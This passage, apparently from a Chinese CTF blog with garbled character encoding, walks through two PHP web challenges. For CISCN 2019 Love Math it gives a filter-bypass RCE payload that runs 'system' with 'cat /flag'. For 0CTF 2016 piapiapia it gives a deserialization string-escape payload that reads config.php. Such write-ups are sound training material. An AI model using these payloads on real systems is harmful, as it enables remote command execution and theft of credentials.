</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nv>$blacklist</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39; &#39;</span><span class=p>,</span> <span class=s1>&#39;\t&#39;</span><span class=p>,</span> <span class=s1>&#39;\r&#39;</span><span class=p>,</span> <span class=s1>&#39;\n&#39;</span><span class=p>,</span><span class=s1>&#39;\&#39;&#39;</span><span class=p>,</span> <span class=s1>&#39;&#34;&#39;</span><span class=p>,</span> <span class=s1>&#39;`&#39;</span><span class=p>,</span> <span class=s1>&#39;\[&#39;</span><span class=p>,</span> <span class=s1>&#39;\]&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>foreach</span> <span class=p>(</span><span class=nv>$blacklist</span> <span class=k>as</span> <span class=nv>$blackitem</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/&#39;</span> <span class=o>.</span> <span class=nv>$blackitem</span> <span class=o>.</span> <span class=s1>&#39;/m&#39;</span><span class=p>,</span> <span class=nv>$content</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>die</span><span class=p>(</span><span class=s2>&#34;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$whitelist</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;abs&#39;</span><span class=p>,</span> <span class=s1>&#39;acos&#39;</span><span class=p>,</span> <span class=s1>&#39;acosh&#39;</span><span class=p>,</span> <span class=s1>&#39;asin&#39;</span><span class=p>,</span> <span class=s1>&#39;asinh&#39;</span><span class=p>,</span> <span class=s1>&#39;atan2&#39;</span><span class=p>,</span> <span class=s1>&#39;atan&#39;</span><span class=p>,</span> <span class=s1>&#39;atanh&#39;</span><span class=p>,</span> <span class=s1>&#39;base_convert&#39;</span><span class=p>,</span> <span class=s1>&#39;bindec&#39;</span><span class=p>,</span> <span class=s1>&#39;ceil&#39;</span><span class=p>,</span> <span class=s1>&#39;cos&#39;</span><span class=p>,</span> <span class=s1>&#39;cosh&#39;</span><span class=p>,</span> <span class=s1>&#39;decbin&#39;</span><span class=p>,</span> <span class=s1>&#39;dechex&#39;</span><span class=p>,</span> <span class=s1>&#39;decoct&#39;</span><span class=p>,</span> <span class=s1>&#39;deg2rad&#39;</span><span class=p>,</span> <span class=s1>&#39;exp&#39;</span><span class=p>,</span> <span class=s1>&#39;expm1&#39;</span><span class=p>,</span> <span class=s1>&#39;floor&#39;</span><span class=p>,</span> <span class=s1>&#39;fmod&#39;</span><span class=p>,</span> <span class=s1>&#39;getrandmax&#39;</span><span class=p>,</span> <span class=s1>&#39;hexdec&#39;</span><span class=p>,</span> <span class=s1>&#39;hypot&#39;</span><span class=p>,</span> <span class=s1>&#39;is_finite&#39;</span><span class=p>,</span> <span class=s1>&#39;is_infinite&#39;</span><span class=p>,</span> <span class=s1>&#39;is_nan&#39;</span><span class=p>,</span> <span class=s1>&#39;lcg_value&#39;</span><span class=p>,</span> <span class=s1>&#39;log10&#39;</span><span class=p>,</span> <span class=s1>&#39;log1p&#39;</span><span class=p>,</span> <span class=s1>&#39;log&#39;</span><span class=p>,</span> <span class=s1>&#39;max&#39;</span><span class=p>,</span> <span class=s1>&#39;min&#39;</span><span class=p>,</span> <span class=s1>&#39;mt_getrandmax&#39;</span><span class=p>,</span> <span class=s1>&#39;mt_rand&#39;</span><span class=p>,</span> <span class=s1>&#39;mt_srand&#39;</span><span class=p>,</span> <span class=s1>&#39;octdec&#39;</span><span class=p>,</span> <span class=s1>&#39;pi&#39;</span><span class=p>,</span> <span class=s1>&#39;pow&#39;</span><span class=p>,</span> <span class=s1>&#39;rad2deg&#39;</span><span class=p>,</span> <span class=s1>&#39;rand&#39;</span><span class=p>,</span> <span class=s1>&#39;round&#39;</span><span class=p>,</span> <span class=s1>&#39;sin&#39;</span><span class=p>,</span> <span class=s1>&#39;sinh&#39;</span><span class=p>,</span> <span class=s1>&#39;sqrt&#39;</span><span class=p>,</span> <span class=s1>&#39;srand&#39;</span><span class=p>,</span> <span class=s1>&#39;tan&#39;</span><span class=p>,</span> <span class=s1>&#39;tanh&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nx>preg_match_all</span><span class=p>(</span><span class=s1>&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;</span><span class=p>,</span> <span class=nv>$content</span><span class=p>,</span> <span class=nv>$used_funcs</span><span class=p>);</span>  
</span></span><span class=line><span class=cl>    <span class=k>foreach</span> <span class=p>(</span><span class=nv>$used_funcs</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=k>as</span> <span class=nv>$func</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$func</span><span class=p>,</span> <span class=nv>$whitelist</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>die</span><span class=p>(</span><span class=s2>&#34;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>//å¸®ä½ ç®—å‡ºç­”æ¡ˆ
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>eval</span><span class=p>(</span><span class=s1>&#39;echo &#39;</span><span class=o>.</span><span class=nv>$content</span><span class=o>.</span><span class=s1>&#39;;&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>å¿«è¢«ææ­»äº†ï¼Œæ˜¯ä¸€é“æœ‰è¿‡æ»¤é™åˆ¶çš„RCEï¼ŒåŠå¤©æ²¡æœ‰å¤´ç»ªå°±å»çœ‹wpäº†ã€‚</p><p><a class=link href=https://www.cnblogs.com/20175211lyz/p/11588219.html target=_blank rel=noopener>åˆ·é¢˜è®°å½•ï¼š[CISCN 2019 åˆèµ›]Love Math</a></p><p>æœ€åè‡ªå·±ç¢ç£¨å‡ºæ¥äº†ä¸€ä¸ªpayloadï¼Œæ€è·¯å½“ç„¶è¿˜æ˜¯å‚è€ƒä¸Šé¢å¸ˆå‚…åšå®¢çš„ã€‚</p><p>åˆ©ç”¨<code>$whitelist</code>é‡Œçš„å‡½æ•°åç§°å’Œæ•°å­—éå†å¼‚æˆ–<code>^</code>ï¼ŒFuzzæ‰¾å‡ºæ¥éœ€è¦çš„å­—æ¯ï¼Œç„¶åæ‹¼æ¥ä¸€ä¸ª<code>_GET</code>ä¼ å‚æ‰§è¡Œå‘½ä»¤ã€‚</p><p>Fuzzçš„ä»£ç </p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$whitelist</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;abs&#39;</span><span class=p>,</span> <span class=s1>&#39;acos&#39;</span><span class=p>,</span> <span class=s1>&#39;acosh&#39;</span><span class=p>,</span> <span class=s1>&#39;asin&#39;</span><span class=p>,</span> <span class=s1>&#39;asinh&#39;</span><span class=p>,</span> <span class=s1>&#39;atan2&#39;</span><span class=p>,</span> <span class=s1>&#39;atan&#39;</span><span class=p>,</span> <span class=s1>&#39;atanh&#39;</span><span class=p>,</span> <span class=s1>&#39;base_convert&#39;</span><span class=p>,</span> <span class=s1>&#39;bindec&#39;</span><span class=p>,</span> <span class=s1>&#39;ceil&#39;</span><span class=p>,</span> <span class=s1>&#39;cos&#39;</span><span class=p>,</span> <span class=s1>&#39;cosh&#39;</span><span class=p>,</span> <span class=s1>&#39;decbin&#39;</span><span class=p>,</span> <span class=s1>&#39;dechex&#39;</span><span class=p>,</span> <span class=s1>&#39;decoct&#39;</span><span class=p>,</span> <span class=s1>&#39;deg2rad&#39;</span><span class=p>,</span> <span class=s1>&#39;exp&#39;</span><span class=p>,</span> <span class=s1>&#39;expm1&#39;</span><span class=p>,</span> <span class=s1>&#39;floor&#39;</span><span class=p>,</span> <span class=s1>&#39;fmod&#39;</span><span class=p>,</span> <span class=s1>&#39;getrandmax&#39;</span><span class=p>,</span> <span class=s1>&#39;hexdec&#39;</span><span class=p>,</span> <span class=s1>&#39;hypot&#39;</span><span class=p>,</span> <span class=s1>&#39;is_finite&#39;</span><span class=p>,</span> <span class=s1>&#39;is_infinite&#39;</span><span class=p>,</span> <span class=s1>&#39;is_nan&#39;</span><span class=p>,</span> <span class=s1>&#39;lcg_value&#39;</span><span class=p>,</span> <span class=s1>&#39;log10&#39;</span><span class=p>,</span> <span class=s1>&#39;log1p&#39;</span><span class=p>,</span> <span class=s1>&#39;log&#39;</span><span class=p>,</span> <span class=s1>&#39;max&#39;</span><span class=p>,</span> <span class=s1>&#39;min&#39;</span><span class=p>,</span> <span class=s1>&#39;mt_getrandmax&#39;</span><span class=p>,</span> <span class=s1>&#39;mt_rand&#39;</span><span class=p>,</span> <span class=s1>&#39;mt_srand&#39;</span><span class=p>,</span> <span class=s1>&#39;octdec&#39;</span><span class=p>,</span> <span class=s1>&#39;pi&#39;</span><span class=p>,</span> <span class=s1>&#39;pow&#39;</span><span class=p>,</span> <span class=s1>&#39;rad2deg&#39;</span><span class=p>,</span> <span class=s1>&#39;rand&#39;</span><span class=p>,</span> <span class=s1>&#39;round&#39;</span><span class=p>,</span> <span class=s1>&#39;sin&#39;</span><span class=p>,</span> <span class=s1>&#39;sinh&#39;</span><span class=p>,</span> <span class=s1>&#39;sqrt&#39;</span><span class=p>,</span> <span class=s1>&#39;srand&#39;</span><span class=p>,</span> <span class=s1>&#39;tan&#39;</span><span class=p>,</span> <span class=s1>&#39;tanh&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$exp</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=p>(</span><span class=nv>$i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=nv>$i</span> <span class=o>&lt;</span> <span class=nx>count</span><span class=p>(</span><span class=nv>$whitelist</span><span class=p>);</span> <span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span> 
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=p>(</span><span class=nv>$j</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=nv>$j</span> <span class=o>&lt;</span> <span class=mi>1000</span><span class=p>;</span> <span class=nv>$j</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span> 
</span></span><span class=line><span class=cl>		<span class=nv>$exp</span><span class=o>=</span><span class=nv>$whitelist</span><span class=p>[</span><span class=nv>$i</span><span class=p>]</span><span class=o>^</span><span class=nv>$j</span><span class=o>.</span><span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=k>echo</span> <span class=nv>$whitelist</span><span class=p>[</span><span class=nv>$i</span><span class=p>]</span><span class=o>.</span><span class=s2>&#34;^&#34;</span><span class=o>.</span><span class=nv>$j</span><span class=o>.</span><span class=s2>&#34;----&#34;</span><span class=o>.</span><span class=nv>$exp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=k>echo</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>éœ€è¦çŸ¥é“çš„æœ‰ï¼ŒphpæŸä¸ªç‰ˆæœ¬ä»¥åå¯ä»¥ä½¿ç”¨å‡½æ•°ååŠ <code>()</code>çš„æ–¹å¼è°ƒç”¨å‡½æ•°ï¼Œå¦‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>base_convert</span><span class=p>(</span><span class=s2>&#34;strtoupper&#34;</span><span class=p>,</span> <span class=mi>36</span><span class=p>,</span> <span class=mi>10</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$cos</span><span class=o>=</span><span class=nx>base_convert</span><span class=p>(</span><span class=s2>&#34;2927671435926243&#34;</span><span class=p>,</span> <span class=mi>10</span><span class=p>,</span> <span class=mi>36</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=o>.</span><span class=nv>$cos</span><span class=p>(</span><span class=s2>&#34;abc&#34;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>ä¸Šé¢ä»£ç æ˜¯æŠŠå­—ç¬¦ä¸²<strong>strtoupper</strong>èµ‹å€¼åˆ°å˜é‡<code>$cos</code>ï¼Œç„¶åç›´æ¥ä½¿ç”¨<code>$cos()</code>æ‰§è¡Œ<code>strtoupper()</code>å‡½æ•°ã€‚ä»£ç ä¸­ä½¿ç”¨<code>base_convert</code>å‡½æ•°ä¹Ÿæ˜¯è¿™é“é¢˜çš„ä¸€ç§æ€è·¯å“¦ã€‚ï¹™ËŠ_>Ë‹ï¹š</p><p>è¿˜éœ€è¦çŸ¥é“çš„æ˜¯å¼‚æˆ–çš„æ—¶å€™ä¼šæç¤ºï¼šå­—ç¬¦ä¸²å’Œæ•°å­—ä¸èƒ½ç›´æ¥å¼‚æˆ–ï¼Œä½¿ç”¨æ‹¬å·<code>()</code>æ‹¬èµ·æ¥å°±å¯ä»¥äº†ã€‚<code>$</code>å¦‚æœç›´æ¥æ‹¼æ¥åˆ°å­—ç¬¦ä¸²ä¸Šä¹Ÿæ˜¯ä¸å¯ä»¥çš„ï¼Œéœ€è¦ä½¿ç”¨å½¢å¦‚<code>$$cos</code>æ‰å¯ä»¥æ­£ç¡®çš„æŒ‡å‘å˜é‡ã€‚</p><p>æœ€ç»ˆpayloadï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>?</span><span class=nx>c</span><span class=o>=</span><span class=nv>$cos</span><span class=o>=</span><span class=p>(</span><span class=nx>is_finite</span><span class=o>^</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span><span class=o>.</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span><span class=o>.</span><span class=p>(</span><span class=nx>rad2deg</span><span class=o>^</span><span class=p>(</span><span class=mi>7</span><span class=p>)</span><span class=o>.</span><span class=p>(</span><span class=mi>5</span><span class=p>));</span><span class=nv>$cos</span><span class=o>=</span><span class=nv>$$cos</span><span class=p>;</span><span class=nv>$cos</span><span class=p>{</span><span class=mi>0</span><span class=p>}(</span><span class=nv>$cos</span><span class=p>{</span><span class=mi>1</span><span class=p>})</span><span class=o>&amp;</span><span class=mi>0</span><span class=o>=</span><span class=nx>system</span><span class=o>&amp;</span><span class=mi>1</span><span class=o>=</span><span class=nx>cat</span> <span class=o>/</span><span class=nx>flag</span>
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=0ctf-2016piapiapia>[0CTF 2016]piapiapia</h1><p>ä½¿ç”¨ç›®å½•æ‰«æå‘ç°äº†www.zipç½‘ç«™å¤‡ä»½ã€‚</p><p>ç½‘ç«™ç»“æ„</p><blockquote><p>static</p><p>upload</p><p>class.php</p><p>config.php</p><p>index.php</p><p>profile.php</p><p>register.php</p><p>update.php</p></blockquote><p>å‘ç°æœ‰registerå°±å»æ³¨å†Œä¸ªè¯•è¯•å‘—</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210309102253.png loading=lazy></p><p>æ³¨å†ŒæˆåŠŸå°±è·³è½¬åˆ°update.phpç•Œé¢äº†ï¼Œæ˜¯ä¸ªä¿®æ”¹ä¿¡æ¯çš„ï¼ŒæŸ¥çœ‹æºç ï¼Œä¿®æ”¹ä¿¡æ¯æœ‰æ‰‹æœºå·</p><p>é‚®ç®±ã€æ˜µç§°ã€å›¾ç‰‡ï¼Œè¿˜ç”¨äº†ä¸€äº›æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤ï¼Œå¦‚æ‰‹æœºå¿…é¡»11ä½ã€é‚®ç®±æœ‰@å’Œç‚¹ã€æ˜µç§°é•¿åº¦ä¸å¤§äº10ã€å›¾ç‰‡åç§°ä½¿ç”¨äº†md5è¿›è¡ŒåŠ å¯†ã€‚å¡«å†™ä¿¡æ¯ä»¥åè·³è½¬åˆ°äº†profile.phpé¡µé¢ã€‚æ³¨æ„åˆ°å›¾ç‰‡æ‰€åœ¨çš„æ ‡ç­¾æ˜¯ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;data:image/gif;base64,.......</span>
</span></span></code></pre></td></tr></table></div></div><p>æŸ¥çœ‹æºç profile.phpä¸­æ˜¯è¿™æ ·çš„</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$profile</span> <span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$profile</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nv>$phone</span> <span class=o>=</span> <span class=nv>$profile</span><span class=p>[</span><span class=s1>&#39;phone&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>		<span class=nv>$email</span> <span class=o>=</span> <span class=nv>$profile</span><span class=p>[</span><span class=s1>&#39;email&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>		<span class=nv>$nickname</span> <span class=o>=</span> <span class=nv>$profile</span><span class=p>[</span><span class=s1>&#39;nickname&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>		<span class=nv>$photo</span> <span class=o>=</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$profile</span><span class=p>[</span><span class=s1>&#39;photo&#39;</span><span class=p>]));</span>
</span></span></code></pre></td></tr></table></div></div><p>è¯»å–æ–‡ä»¶ä»¥åä½¿ç”¨base64åŠ å¯†çš„è¯ä¸Šä¼ çš„åœ°æ–¹è‚¯å®šæ˜¯ä¸èƒ½ç”¨å›¾ç‰‡é©¬ä»€ä¹ˆçš„äº†ã€‚è¿˜æ³¨æ„åˆ°ä½¿ç”¨äº†<code>unserialize</code>ï¼Œåºåˆ—åŒ–ä¹Ÿæ˜¯æ€è·¯ã€‚æƒ³è¯•è¯•ç›´æ¥è¯»flagæ‰€åœ¨æ–‡ä»¶ï¼Œåœ¨config.phpä¸­æ‰¾åˆ°äº†flagæ‰€åœ¨åœ°</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>	<span class=nv>$config</span><span class=p>[</span><span class=s1>&#39;hostname&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;127.0.0.1&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$config</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;root&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$config</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$config</span><span class=p>[</span><span class=s1>&#39;database&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$flag</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p><del>ä¸‹è½½çš„æºç è‚¯å®šä¸ä¼šæŠŠflagç›´æ¥ç»™ä½ </del>ï¼Œè¦ç›¸åŠæ³•è¯»è¿™ä¸ªæ–‡ä»¶ã€‚çœ‹åˆ°äº†æ•°æ®åº“é…ç½®ï¼Œæ„Ÿè§‰åºåˆ—åŒ–çš„å¯¹è±¡åº”è¯¥ä¹Ÿæ˜¯ä»æ•°æ®åº“è¯»å‡ºæ¥çš„ï¼Œè¿˜æœ‰ä¸€ä¸ªæ–‡ä»¶æ²¡æœ‰çœ‹ï¼šclass.phpï¼Œé¡ºä¾¿è·Ÿè¿›ä¸€ä¸‹userå¯¹è±¡ç›¸å…³çš„ï¼Œæ³¨æ„åˆ°äº†æ³¨å†Œå’Œç™»é™†éƒ½ä½¿ç”¨åˆ°äº†ä¸€ä¸ªå‡½æ•°ï¼š<code>filter</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$username</span> <span class=o>=</span> <span class=k>parent</span><span class=o>::</span><span class=na>filter</span><span class=p>(</span><span class=nv>$username</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$password</span> <span class=o>=</span> <span class=k>parent</span><span class=o>::</span><span class=na>filter</span><span class=p>(</span><span class=nv>$password</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>è·Ÿè¿›ä¸€ä¸‹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=nf>filter</span><span class=p>(</span><span class=nv>$string</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nv>$escape</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;\&#39;&#39;</span><span class=p>,</span> <span class=s1>&#39;\\\\&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nv>$escape</span> <span class=o>=</span> <span class=s1>&#39;/&#39;</span> <span class=o>.</span> <span class=nx>implode</span><span class=p>(</span><span class=s1>&#39;|&#39;</span><span class=p>,</span> <span class=nv>$escape</span><span class=p>)</span> <span class=o>.</span> <span class=s1>&#39;/&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=nv>$string</span> <span class=o>=</span> <span class=nx>preg_replace</span><span class=p>(</span><span class=nv>$escape</span><span class=p>,</span> <span class=s1>&#39;_&#39;</span><span class=p>,</span> <span class=nv>$string</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=nv>$safe</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;select&#39;</span><span class=p>,</span> <span class=s1>&#39;insert&#39;</span><span class=p>,</span> <span class=s1>&#39;update&#39;</span><span class=p>,</span> <span class=s1>&#39;delete&#39;</span><span class=p>,</span> <span class=s1>&#39;where&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nv>$safe</span> <span class=o>=</span> <span class=s1>&#39;/&#39;</span> <span class=o>.</span> <span class=nx>implode</span><span class=p>(</span><span class=s1>&#39;|&#39;</span><span class=p>,</span> <span class=nv>$safe</span><span class=p>)</span> <span class=o>.</span> <span class=s1>&#39;/i&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=nx>preg_replace</span><span class=p>(</span><span class=nv>$safe</span><span class=p>,</span> <span class=s1>&#39;hacker&#39;</span><span class=p>,</span> <span class=nv>$string</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>è¿‡æ»¤<code>_</code>ï¼Œselectã€insertã€updateã€deleteã€whereä¼šè¢«æ›¿æ¢æˆ<code>hacker</code>ï¼Œwhereé•¿åº¦æ˜¯5ï¼Œhackeré•¿åº¦æ˜¯6ï¼Œæ•æ„Ÿä¸€ç‚¹çš„åº”è¯¥æƒ³åˆ°äº†åºåˆ—åŒ–å­—ç¬¦ä¸²å¯¹è±¡ä¹Ÿæ˜¯ç”¨å­—ç¬¦ä¸²é•¿åº¦çš„ï¼Œè¿™æ ·é•¿åº¦æ”¹å˜çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨<a class=link href=https://my.oschina.net/u/3076320/blog/4372683 target=_blank rel=noopener>PHPååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</a>ï¼Œåºåˆ—åŒ–çš„ç»“å°¾æ˜¯<code>";}</code>å¯ä»¥æ‰‹åŠ¨æ„é€ é—­åˆã€‚</p><p>ç°åœ¨æ•´ç†ä¸‹æ€è·¯ã€‚å›¾ç‰‡å±æ€§é‚£é‡Œå¯ä»¥è¯»æ–‡ä»¶ï¼Œè¿‡æ»¤å‡½æ•°ä¼šå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸ï¼Œæ‰€ä»¥å°±æ„é€ photoè¯»å–config.phpã€‚é‚£ä¹ˆé€ƒé€¸çš„ç‚¹åœ¨å“ªé‡Œï¼Ÿç”µè¯åªèƒ½æ˜¯æ•°å­—ï¼Œé‚®ç®±éœ€è¦æœ‰@ç­‰å­—ç¬¦ï¼Œå›¾ç‰‡ä¼šè¢«md5åŠ å¯†ï¼Œæ˜µç§°å“ªé‡Œè™½ç„¶æœ‰é•¿åº¦é™åˆ¶ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬ä¼ å…¥æ•°ç»„çš„è¯å°±å¯ä»¥ç»•è¿‡ã€‚é‚£ä¹ˆå¼€å·¥</p><p>å…ˆä¸Špayload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&#34;;}s:5:&#34;photo&#34;;s:10:&#34;config.php&#34;;}
